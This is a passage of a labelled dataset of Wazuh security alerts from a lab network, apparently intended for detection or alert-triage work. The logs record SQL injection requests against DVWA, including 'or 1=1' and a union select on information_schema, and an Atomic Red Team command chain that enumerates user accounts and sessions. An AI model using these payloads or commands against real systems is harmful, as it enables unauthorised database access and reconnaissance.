{ff3427f9-2077-6868-5c01-000000001400}\r\nParentProcessId: 9196\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-04T21:51:32.1103738Z", "eventRecordID": "392154", "threadID": "3992", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3056", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 69, "mail": false, "description": "Powershell process spawned powershell instance", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["PowerShell"], "id": ["T1059.001"], "tactic": ["Execution"]}, "id": "92027"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751665894.64562370", "timestamp": "2025-07-04T21:51:34.886+0000"}, "fields": {"timestamp": ["2025-07-04T21:51:34.886Z"]}, "sort": [1751665894886]}}
{"id": "xxdS15cB1Hp-jZ7fubD2", "description": "A web attack returned code 200 (success).", "label": "TP", "rule_level": 6, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "xxdS15cB1Hp-jZ7fubD2", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.9", "name": "Linux-Server", "id": "002"}, "manager": {"name": "wazuh-server"}, "data": {"protocol": "GET", "srcip": "10.0.2.14", "id": "200", "url": "/DVWA/vulnerabilities/sqli/?id=+%27+union+select+table_name%2Cnull+from+information_schema.tables%23&Submit=Submit&user_token=45d502c959d23a1f39dbdeecb40b3ad0"}, "rule": {"firedtimes": 1, "mail": false, "pci_dss": ["6.5", "11.4"], "tsc": ["CC6.6", "CC7.1", "CC8.1", "CC6.1", "CC6.8", "CC7.2", "CC7.3"], "description": "A web attack returned code 200 (success).", "groups": ["web", "accesslog", "attack"], "mitre": {"technique": ["Exploit Public-Facing Application"], "id": ["T1190"], "tactic": ["Initial Access"]}, "id": "31106", "nist_800_53": ["SA.11", "SI.4"], "gdpr": ["IV_35.7.d"]}, "location": "/var/log/apache2/access.log", "decoder": {"name": "web-accesslog"}, "id": "1751664210.61937889", "full_log": "10.0.2.14 - - [04/Jul/2025:21:23:28 +0000] \"GET /DVWA/vulnerabilities/sqli/?id=+%27+union+select+table_name%2Cnull+from+information_schema.tables%23&Submit=Submit&user_token=45d502c959d23a1f39dbdeecb40b3ad0 HTTP/1.1\" 200 1845 \"http://10.0.2.9/DVWA/vulnerabilities/sqli/?id=%27+or+1%3D1&Submit=Submit&user_token=da59db29379faf3476dc05aaaea53f0f\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0\"", "timestamp": "2025-07-04T21:23:30.056+0000"}, "fields": {"timestamp": ["2025-07-04T21:23:30.056Z"]}, "sort": [1751664210056]}}
{"id": "xhdS15cB1Hp-jZ7ff7BW", "description": "SQL injection attempt.", "label": "TP", "rule_level": 6, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "xhdS15cB1Hp-jZ7ff7BW", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.9", "name": "Linux-Server", "id": "002"}, "manager": {"name": "wazuh-server"}, "data": {"protocol": "GET", "srcip": "10.0.2.14", "id": "200", "url": "/DVWA/vulnerabilities/sqli/?id=%27+or+1%3D1&Submit=Submit&user_token=da59db29379faf3476dc05aaaea53f0f"}, "rule": {"firedtimes": 2, "mail": false, "pci_dss": ["6.5", "11.4", "6.5.1"], "tsc": ["CC6.6", "CC7.1", "CC8.1", "CC6.1", "CC6.8", "CC7.2", "CC7.3"], "description": "SQL injection attempt.", "groups": ["web", "accesslog", "attack", "sqlinjection", "attack"], "mitre": {"technique": ["Process Injection", "Exploit Public-Facing Application"], "id": ["T1055", "T1190"], "tactic": ["Defense Evasion", "Privilege Escalation", "Initial Access"]}, "id": "31164", "nist_800_53": ["SA.11", "SI.4"], "gdpr": ["IV_35.7.d"]}, "location": "/var/log/apache2/access.log", "decoder": {"name": "web-accesslog"}, "id": "1751664191.61937114", "full_log": "10.0.2.14 - - [04/Jul/2025:21:23:11 +0000] \"GET /DVWA/vulnerabilities/sqli/?id=%27+or+1%3D1&Submit=Submit&user_token=da59db29379faf3476dc05aaaea53f0f HTTP/1.1\" 200 1843 \"http://10.0.2.9/DVWA/vulnerabilities/sqli/?id=&Submit=Submit&user_token=7d2e20f9264c9f25895fee47feea3be6\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0\"", "timestamp": "2025-07-04T21:23:11.869+0000"}, "fields": {"timestamp": ["2025-07-04T21:23:11.869Z"]}, "sort": [1751664191869]}}
{"id": "xRdS15cB1Hp-jZ7fY7D9", "description": "SQL injection attempt.", "label": "TP", "rule_level": 6, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.04", "_id": "xRdS15cB1Hp-jZ7fY7D9", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.9", "name": "Linux-Server", "id": "002"}, "manager": {"name": "wazuh-server"}, "data": {"protocol": "GET", "srcip": "10.0.2.14", "id": "200", "url": "/DVWA/vulnerabilities/sqli/?id=%27+or+1%3D1%23&Submit=Submit&user_token=d4eb64c9b84265fa1a696e43b957a44c"}, "rule": {"firedtimes": 1, "mail": false, "pci_dss": ["6.5", "11.4", "6.5.1"], "tsc": ["CC6.6", "CC7.1", "CC8.1", "CC6.1", "CC6.8", "CC7.2", "CC7.3"], "description": "SQL injection attempt.", "groups": ["web", "accesslog", "attack", "sqlinjection", "attack"], "mitre": {"technique": ["Process Injection", "Exploit Public-Facing Application"], "id": ["T1055", "T1190"], "tactic": ["Defense Evasion", "Privilege Escalation", "Initial Access"]}, "id": "31164", "nist_800_53": ["SA.11", "SI.4"], "gdpr": ["IV_35.7.d"]}, "location": "/var/log/apache2/access.log", "decoder": {"name": "web-accesslog"}, "id": "1751664187.61936335", "full_log": "10.0.2.14 - - [04/Jul/2025:21:23:07 +0000] \"GET /DVWA/vulnerabilities/sqli/?id=%27+or+1%3D1%23&Submit=Submit&user_token=d4eb64c9b84265fa1a696e43b957a44c HTTP/1.1\" 200 1842 \"http://10.0.2.9/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit&user_token=b922d45d08bcb54463ee09c63d492669\" \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0\"", "timestamp": "2025-07-04T21:23:07.854+0000"}, "fields": {"timestamp": ["2025-07-04T21:23:07.854Z"]}, "sort": [1751664187854]}}
{"id": "qamt2pcBGfDWR0X_U76C", "description": "Windows command prompt started by an abnormal process", "label": "TP", "rule_level": 4, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.05", "_id": "qamt2pcBGfDWR0X_U76C", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "Cmd.Exe", "image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-20c8-6869-f800-000000001500}", "description": "Windows Command Processor", "logonGuid": "{ff3427f9-2071-6869-6f2f-080000000000}", "parentCommandLine": "\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\"", "processGuid": "{ff3427f9-221e-6869-8301-000000001500}", "logonId": "0x82f6f", "parentProcessId": "2440", "processId": "8424", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-05 13:01:18.692", "hashes": "SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6", "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "\\\"cmd.exe\\\" /c cscript \\\"C:\\\\AtomicRedTeam\\\\atomics\\\\T1059.007\\\\src\\\\sys_info.js\\\" &gt; %%tmp%%\\\\T1059.007.out.txt", "integrityLevel": "High", "fileVersion": "10.0.26100.4202 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-05 13:01:18.692\r\nProcessGuid: {ff3427f9-221e-6869-8301-000000001500}\r\nProcessId: 8424\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.26100.4202 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: \"cmd.exe\" /c cscript \"C:\\AtomicRedTeam\\atomics\\T1059.007\\src\\sys_info.js\" > %%tmp%%\\T1059.007.out.txt\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-2071-6869-6f2f-080000000000}\r\nLogonId: 0x82F6F\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6\r\nParentProcessGuid: {ff3427f9-20c8-6869-f800-000000001500}\r\nParentProcessId: 2440\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-05T13:01:18.7175295Z", "eventRecordID": "395318", "threadID": "3628", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3068", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 1, "mail": false, "description": "Windows command prompt started by an abnormal process", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Windows Command Shell"], "id": ["T1059.003"], "tactic": ["Execution"]}, "id": "92052"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751720480.1980758", "timestamp": "2025-07-05T13:01:20.015+0000"}, "fields": {"timestamp": ["2025-07-05T13:01:20.015Z"]}, "sort": [1751720480015]}}
{"id": "rKmt2pcBGfDWR0X_br7n", "description": "Suspicious Windows cmd shell execution", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.05", "_id": "rKmt2pcBGfDWR0X_br7n", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "wscript.exe", "image": "C:\\\\Windows\\\\System32\\\\wscript.exe", "product": "Microsoft \u00ae Windows Script Host", "parentProcessGuid": "{ff3427f9-2223-6869-8701-000000001500}", "description": "Microsoft \u00ae Windows Based Script Host", "logonGuid": "{ff3427f9-2071-6869-6f2f-080000000000}", "parentCommandLine": "\\\"cmd.exe\\\" /c wscript \\\"C:\\\\AtomicRedTeam\\\\atomics\\\\T1059.007\\\\src\\\\sys_info.js\\\"", "processGuid": "{ff3427f9-2223-6869-8901-000000001500}", "logonId": "0x82f6f", "parentProcessId": "8152", "processId": "4496", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-05 13:01:23.197", "hashes": "SHA1=F17CFCD2BDA29421AD37F8764C514396A1DEA7C9,MD5=60933788CB36C3EE2199626C5EC8ADA0,SHA256=7D31A31136319D0A277C7FB0E9BBCB46BA3535A42AEB0307FED70F92649F4162,IMPHASH=EE6DDCBA60642B0ADD3CAB9EA721BEE2", "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "wscript  \\\"C:\\\\AtomicRedTeam\\\\atomics\\\\T1059.007\\\\src\\\\sys_info.js\\\"", "integrityLevel": "High", "fileVersion": "5.812.10240.16384", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-05 13:01:23.197\r\nProcessGuid: {ff3427f9-2223-6869-8901-000000001500}\r\nProcessId: 4496\r\nImage: C:\\Windows\\System32\\wscript.exe\r\nFileVersion: 5.812.10240.16384\r\nDescription: Microsoft \u00ae Windows Based Script Host\r\nProduct: Microsoft \u00ae Windows Script Host\r\nCompany: Microsoft Corporation\r\nOriginalFileName: wscript.exe\r\nCommandLine: wscript  \"C:\\AtomicRedTeam\\atomics\\T1059.007\\src\\sys_info.js\"\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-2071-6869-6f2f-080000000000}\r\nLogonId: 0x82F6F\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=F17CFCD2BDA29421AD37F8764C514396A1DEA7C9,MD5=60933788CB36C3EE2199626C5EC8ADA0,SHA256=7D31A31136319D0A277C7FB0E9BBCB46BA3535A42AEB0307FED70F92649F4162,IMPHASH=EE6DDCBA60642B0ADD3CAB9EA721BEE2\r\nParentProcessGuid: {ff3427f9-2223-6869-8701-000000001500}\r\nParentProcessId: 8152\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"cmd.exe\" /c wscript \"C:\\AtomicRedTeam\\atomics\\T1059.007\\src\\sys_info.js\"\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-05T13:01:23.2148647Z", "eventRecordID": "395336", "threadID": "3628", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3068", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 2, "mail": false, "description": "Suspicious Windows cmd shell execution", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Account Discovery", "Windows Command Shell"], "id": ["T1087", "T1059.003"], "tactic": ["Discovery", "Execution"]}, "id": "92032"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751720484.2000092", "timestamp": "2025-07-05T13:01:24.468+0000"}, "fields": {"timestamp": ["2025-07-05T13:01:24.468Z"]}, "sort": [1751720484468]}}
{"id": "s6mu2pcBGfDWR0X_oL4E", "description": "Windows command prompt started by an abnormal process", "label": "TP", "rule_level": 4, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.05", "_id": "s6mu2pcBGfDWR0X_oL4E", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "Cmd.Exe", "image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-20c8-6869-f800-000000001500}", "description": "Windows Command Processor", "logonGuid": "{ff3427f9-2071-6869-6f2f-080000000000}", "parentCommandLine": "\\\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe\\\"", "processGuid": "{ff3427f9-226b-6869-8f01-000000001500}", "logonId": "0x82f6f", "parentProcessId": "2440", "processId": "9176", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-05 13:02:35.164", "hashes": "SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6", "parentImage": "C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\\\\powershell.exe", "ruleName": "technique_id=T1027,technique_name=Obfuscated Files or Information", "company": "Microsoft Corporation", "commandLine": "\\\"cmd.exe\\\" /c cmd.exe /C whoami &amp; wmic useraccount get /ALL &amp; quser /SERVER:\\\"localhost\\\" &amp; quser &amp; qwinsta.exe /server:localhost &amp; qwinsta.exe &amp; for /F \\\"tokens=1,2\\\" %%i in ('qwinsta /server:localhost ^| findstr \\\"Active Disc\\\"') do @echo %%i | find /v \\\"#\\\" | find /v \\\"console\\\" || echo %%j &gt; computers.txt &amp; @FOR /F %%n in (computers.txt) DO @FOR /F \\\"tokens=1,2\\\" %%i in ('qwinsta /server:%%n ^| findstr \\\"Active Disc\\\"') do @echo %%i | find /v \\\"#\\\" | find /v \\\"console\\\" || echo %%j &gt; usernames.txt", "integrityLevel": "High", "fileVersion": "10.0.26100.4202 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1027,technique_name=Obfuscated Files or Information\r\nUtcTime: 2025-07-05 13:02:35.164\r\nProcessGuid: {ff3427f9-226b-6869-8f01-000000001500}\r\nProcessId: 9176\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.26100.4202 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: \"cmd.exe\" /c cmd.exe /C whoami & wmic useraccount get /ALL & quser /SERVER:\"localhost\" & quser & qwinsta.exe /server:localhost & qwinsta.exe & for /F \"tokens=1,2\" %%i in ('qwinsta /server:localhost ^| findstr \"Active Disc\"') do @echo %%i | find /v \"#\" | find /v \"console\" || echo %%j > computers.txt & @FOR /F %%n in (computers.txt) DO @FOR /F \"tokens=1,2\" %%i in ('qwinsta /server:%%n ^| findstr \"Active Disc\"') do @echo %%i | find /v \"#\" | find /v \"console\" || echo %%j > usernames.txt\r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-2071-6869-6f2f-080000000000}\r\nLogonId: 0x82F6F\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6\r\nParentProcessGuid: {ff3427f9-20c8-6869-f800-000000001500}\r\nParentProcessId: 2440\r\nParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\r\nParentCommandLine: \"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-05T13:02:35.1786171Z", "eventRecordID": "395363", "threadID": "3628", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3068", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 3, "mail": false, "description": "Windows command prompt started by an abnormal process", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Windows Command Shell"], "id": ["T1059.003"], "tactic": ["Execution"]}, "id": "92052"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751720556.2028644", "timestamp": "2025-07-05T13:02:36.184+0000"}, "fields": {"timestamp": ["2025-07-05T13:02:36.184Z"]}, "sort": [1751720556184]}}
{"id": "tKmu2pcBGfDWR0X_oL4E", "description": "Suspicious Windows cmd shell execution", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.05", "_id": "tKmu2pcBGfDWR0X_oL4E", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "Cmd.Exe", "image": "C:\\\\Windows\\\\System32\\\\cmd.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-226b-6869-8f01-000000001500}", "description": "Windows Command Processor", "logonGuid": "{ff3427f9-2071-6869-6f2f-080000000000}", "parentCommandLine": "\\\"cmd.exe\\\" /c cmd.exe /C whoami &amp; wmic useraccount get /ALL &amp; quser /SERVER:\\\"localhost\\\" &amp; quser &amp; qwinsta.exe /server:localhost &amp; qwinsta.exe &amp; for /F \\\"tokens=1,2\\\" %i in ('qwinsta /server:localhost ^| findstr \\\"Active Disc\\\"') do @echo %i | find /v \\\"#\\\" | find /v \\\"console\\\" || echo %j &gt; computers.txt &amp; @FOR /F %n in (computers.txt) DO @FOR /F \\\"tokens=1,2\\\" %i in ('qwinsta /server:%n ^| findstr \\\"Active Disc\\\"') do @echo %i | find /v \\\"#\\\" | find /v \\\"console\\\" || echo %j &gt; usernames.txt", "processGuid": "{ff3427f9-226b-6869-9101-000000001500}", "logonId": "0x82f6f", "parentProcessId": "9176", "processId": "8076", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-05 13:02:35.232", "hashes": "SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6", "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "cmd.exe  /C whoami", "integrityLevel": "High", "fileVersion": "10.0.26100.4202 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-05 13:02:35.232\r\nProcessGuid: {ff3427f9-226b-6869-9101-000000001500}\r\nProcessId: 8076\r\nImage: C:\\Windows\\System32\\cmd.exe\r\nFileVersion: 10.0.26100.4202 (WinBuild.160101.0800)\r\nDescription: Windows Command Processor\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: Cmd.Exe\r\nCommandLine: cmd.exe  /C whoami \r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: SOCLAB\\snell\r\nLogonGuid: {ff3427f9-2071-6869-6f2f-080000000000}\r\nLogonId: 0x82F6F\r\nTerminalSessionId: 1\r\nIntegrityLevel: High\r\nHashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6\r\nParentProcessGuid: {ff3427f9-226b-6869-8f01-000000001500}\r\nParentProcessId: 9176\r\nParentImage: C:\\Windows\\System32\\cmd.exe\r\nParentCommandLine: \"cmd.exe\" /c cmd.exe /C whoami & wmic useraccount get /ALL & quser /SERVER:\"localhost\" & quser & qwinsta.exe /server:localhost & qwinsta.exe & for /F \"tokens=1,2\" %i in ('qwinsta /server:localhost ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > computers.txt & @FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i | find /v \"#\" | find /v \"console\" || echo %j > usernames.txt\r\nParentUser: SOCLAB\\snell\"", "version": "5", "systemTime": "2025-07-05T13:02:35.2415573Z", "eventRecordID": "395367", "threadID": "3628", "computer": "Win11Client.soclab.internal", "task": "1", "processID": "3068", "severityValue": "INFORMATION", "providerName": "Microsoft-Windows-Sysmon"}}}, "rule": {"firedtimes": 3, "mail": false, "description": "Suspicious Windows cmd shell execution", "groups": ["sysmon", "sysmon_eid1_detections", "windows"], "mitre": {"technique": ["Account Discovery", "Windows Command Shell"], "id": ["T1087", "T1059.003"], "tactic": ["Discovery", "Execution"]}, "id": "92032"}, "location": "EventChannel", "decoder": {"name": "windows_eventchannel"}, "id": "1751720556.2036878", "timestamp": "2025-07-05T13:02:36.186+0000"}, "fields": {"timestamp": ["2025-07-05T13:02:36.186Z"]}, "sort": [1751720556186]}}
{"id": "tqmu2pcBGfDWR0X_oL4E", "description": "Suspicious Windows cmd shell execution", "label": "TP", "rule_level": 3, "rule_priority": "Low", "alert": {"_index": "wazuh-alerts-4.x-2025.07.05", "_id": "tqmu2pcBGfDWR0X_oL4E", "_score": null, "_source": {"input": {"type": "log"}, "agent": {"ip": "10.0.2.14", "name": "Win11Client", "id": "003"}, "manager": {"name": "wazuh-server"}, "data": {"win": {"eventdata": {"originalFileName": "wmic.exe", "image": "C:\\\\Windows\\\\System32\\\\wbem\\\\WMIC.exe", "product": "Microsoft\u00ae Windows\u00ae Operating System", "parentProcessGuid": "{ff3427f9-226b-6869-8f01-000000001500}", "description": "WMI Commandline Utility", "logonGuid": "{ff3427f9-2071-6869-6f2f-080000000000}", "parentCommandLine": "\\\"cmd.exe\\\" /c cmd.exe /C whoami &amp; wmic useraccount get /ALL &amp; quser /SERVER:\\\"localhost\\\" &amp; quser &amp; qwinsta.exe /server:localhost &amp; qwinsta.exe &amp; for /F \\\"tokens=1,2\\\" %i in ('qwinsta /server:localhost ^| findstr \\\"Active Disc\\\"') do @echo %i | find /v \\\"#\\\" | find /v \\\"console\\\" || echo %j &gt; computers.txt &amp; @FOR /F %n in (computers.txt) DO @FOR /F \\\"tokens=1,2\\\" %i in ('qwinsta /server:%n ^| findstr \\\"Active Disc\\\"') do @echo %i | find /v \\\"#\\\" | find /v \\\"console\\\" || echo %j &gt; usernames.txt", "processGuid": "{ff3427f9-226b-6869-9301-000000001500}", "logonId": "0x82f6f", "parentProcessId": "9176", "processId": "8536", "currentDirectory": "C:\\\\Users\\\\snell\\\\AppData\\\\Local\\\\Temp\\\\", "utcTime": "2025-07-05 13:02:35.297", "hashes": "SHA1=D5AE0D13127AE8A7F872F5F3A835D6E217C44A86,MD5=76739CA32A2D852E9953BFC5AD0FDC08,SHA256=9C439179991319D1C6BE5ECD50C01738F9DE6B5EE9E8702FEE612E725C086F9F,IMPHASH=43C6BE584D77B658A53A9A5C606724DD", "parentImage": "C:\\\\Windows\\\\System32\\\\cmd.exe", "ruleName": "technique_id=T1059,technique_name=Command-Line Interface", "company": "Microsoft Corporation", "commandLine": "wmic  useraccount get /ALL", "integrityLevel": "High", "fileVersion": "10.0.26100.3323 (WinBuild.160101.0800)", "user": "SOCLAB\\\\snell", "terminalSessionId": "1", "parentUser": "SOCLAB\\\\snell"}, "system": {"eventID": "1", "keywords": "0x8000000000000000", "providerGuid": "{5770385f-c22a-43e0-bf4c-06f5698ffbd9}", "level": "4", "channel": "Microsoft-Windows-Sysmon/Operational", "opcode": "0", "message": "\"Process Create:\r\nRuleName: technique_id=T1059,technique_name=Command-Line Interface\r\nUtcTime: 2025-07-05 13:02:35.297\r\nProcessGuid: {ff3427f9-226b-6869-9301-000000001500}\r\nProcessId: 8536\r\nImage: C:\\Windows\\System32\\wbem\\WMIC.exe\r\nFileVersion: 10.0.26100.3323 (WinBuild.160101.0800)\r\nDescription: WMI Commandline Utility\r\nProduct: Microsoft\u00ae Windows\u00ae Operating System\r\nCompany: Microsoft Corporation\r\nOriginalFileName: wmic.exe\r\nCommandLine: wmic  useraccount get /ALL \r\nCurrentDirectory: C:\\Users\\snell\\AppData\\Local\\Temp\\\r\nUser: 